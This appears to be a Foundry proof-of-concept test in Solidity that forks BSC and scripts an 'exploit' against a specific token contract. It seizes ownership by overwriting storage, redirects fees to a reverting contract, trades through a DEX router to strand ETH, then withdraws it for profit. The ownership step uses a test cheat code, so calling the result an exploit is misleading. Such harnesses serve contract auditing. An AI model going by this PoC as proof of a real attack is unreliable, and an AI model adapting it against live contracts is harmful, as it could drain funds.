// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDexRouter {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface FoundationToken {
    function owner() external view returns (address);
    function setOperationsAddress(address _operationsAddress) external;
    function enableTrading() external;
    function withdrawStuckETH() external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Reverter {
    // No receive or fallback - will revert on ETH transfer
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    address attacker = address(this);

    Reverter reverter;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Fork BSC
        vm.createSelectFork(vm.rpcUrl("bsc"), 35404817);

        // Label addresses
        vm.label(TARGET, "FoundationToken");
        vm.label(attacker, "Attacker");

        // Become owner by overwriting storage slot 0
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Verify ownership
        FoundationToken token = FoundationToken(TARGET);
        require(token.owner() == attacker, "Failed to become owner");

        // Deploy contract that reverts on ETH receipt
        reverter = new Reverter();

        // Set operationsAddress to reverter
        token.setOperationsAddress(address(reverter));

        // Enable trading
        token.enableTrading();

        // Fund attacker with ETH
        deal(attacker, 100 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        FoundationToken token = FoundationToken(TARGET);
        IDexRouter router = IDexRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address weth = router.WETH();

        // Record initial ETH balance
        uint256 initialBalance = address(this).balance;

        // Buy tokens with ETH
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        uint256 buyAmount = 10 ether;
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: buyAmount}(
            0,
            path,
            attacker,
            block.timestamp
        );

        // Get token balance
        uint256 tokenBalance = token.balanceOf(attacker);
        require(tokenBalance > 0, "No tokens bought");

        // Approve router to spend tokens
        token.approve(address(router), tokenBalance);

        // Sell tokens back to ETH - this triggers swapBack()
        path[0] = TARGET;
        path[1] = weth;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0,
            path,
            attacker,
            block.timestamp
        );

        // Check contract has ETH (swapBack() should have failed to send to reverter)
        uint256 contractETH = address(TARGET).balance;
        require(contractETH > 0, "No ETH stuck in contract");

        // Withdraw stuck ETH as owner
        uint256 beforeWithdraw = address(this).balance;
        token.withdrawStuckETH();
        uint256 afterWithdraw = address(this).balance;

        // Verify profit
        assertGt(afterWithdraw, initialBalance, "Attacker ETH should increase");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

